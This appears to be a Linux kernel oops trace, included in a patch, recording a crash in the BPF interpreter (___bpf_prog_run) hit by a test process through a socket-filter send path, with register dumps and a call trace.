+8139cp i2c_piix4 mii
+[  117.274640] CPU: 1 PID: 1197 Comm: crasher_badtrun Tainted: G    B
+D          4.15.0-rc1+ #4
+[  117.274642] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
+BIOS 1.10.2-1 04/01/2014
+[  117.274645] task: 00000000a02f12e8 task.stack: 0000000051644a73
+[  117.274651] RIP: 0010:___bpf_prog_run+0x1a77/0x2490
+[  117.274654] RSP: 0018:ffff8801af4e7838 EFLAGS: 00010292
+[  117.274657] RAX: 0000000000000000 RBX: ffffc90001305108 RCX: ffffffff928483d7
+[  117.274659] RDX: 0000000000000001 RSI: 0000000000000004 RDI: 0fff8801ac81e0f8
+[  117.274661] RBP: ffff8801af4e7968 R08: 0000000000000000 R09: 0000000000000000
+[  117.274664] R10: 0000000000000001 R11: ffffed003dfa0601 R12: ffffffff932be980
+[  117.274666] R13: 1ffff10035e9cf0e R14: 00000000deadbeef R15: 0fff8801ac81e0f8
+[  117.274669] FS:  00007f3efe927700(0000) GS:ffff8801f7640000(0000)
+knlGS:0000000000000000
+[  117.274671] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  117.274674] CR2: 00005654507a9008 CR3: 00000001ec086003 CR4: 00000000001606e0
+[  117.274678] Call Trace:
+[  117.274685]  ? sk_filter_trim_cap+0x5c/0x4e0
+[  117.274688]  ? bpf_jit_compile+0x30/0x30
+[  117.274693]  ? alloc_skb_with_frags+0x90/0x2c0
+[  117.274697]  ? __bpf_prog_run32+0x83/0xc0
+[  117.274700]  ? __bpf_prog_run64+0xc0/0xc0
+[  117.274705]  ? sk_filter_trim_cap+0x5c/0x4e0
+[  117.274710]  ? sk_filter_trim_cap+0xf7/0x4e0
+[  117.274715]  ? unix_dgram_sendmsg+0x3e2/0x960
+[  117.274720]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274724]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274728]  ? sock_alloc_inode+0x46/0x110
+[  117.274731]  ? unix_stream_connect+0x840/0x840
+[  117.274734]  ? __sock_create+0x7f/0x2c0
+[  117.274737]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274742]  ? __lock_acquire.isra.31+0x2d/0xb40
+[  117.274746]  ? __wake_up_common_lock+0xaf/0x130
+[  117.274752]  ? unix_stream_connect+0x840/0x840
+[  117.274755]  ? sock_sendmsg+0x6b/0x80
+[  117.274759]  ? sock_write_iter+0x11d/0x1d0
+[  117.274762]  ? sock_sendmsg+0x80/0x80
+[  117.274768]  ? do_raw_spin_unlock+0x86/0x120
+[  117.274782]  ? iov_iter_init+0x77/0xb0
+[  117.274786]  ? __vfs_write+0x23e/0x340
+[  117.274799]  ? kernel_read+0xa0/0xa0
+[  117.274805]  ? __fd_install+0x5/0x160
+[  117.274809]  ? __fget_light+0x9b/0xb0
+[  117.274813]  ? vfs_write+0xe9/0x240
+[  117.274817]  ? SyS_write+0xa7/0x130
+[  117.274820]  ? SyS_read+0x130/0x130
+[  117.274823]  ? lockdep_sys_exit+0x16/0x8e
+[  117.274827]  ? lockdep_sys_exit_thunk+0x16/0x2b
+[  117.274831]  ? entry_SYSCALL_64_fastpath+0x1e/0x86
+[  117.274836] Code: 00 48 0f bf 43 fa 49 01 c7 0f b6 43 f9 c0 e8 04
+0f b6 c0 4c 8d 74 c5 00 4c 89 f7 e8 04 4a 0f 00 4d 8b 36 4c 89 ff e8
+79 49 0f 00 <45> 89 37 e9 17 e6 ff ff 48 8d 7b 01 e8 58 47 0f 00 0f b6
+43 01
+[  117.274885] RIP: ___bpf_prog_run+0x1a77/0x2490 RSP: ffff8801af4e7838
+[  117.274888] ---[ end trace e84b3275ee7b48c9 ]---
+======================================
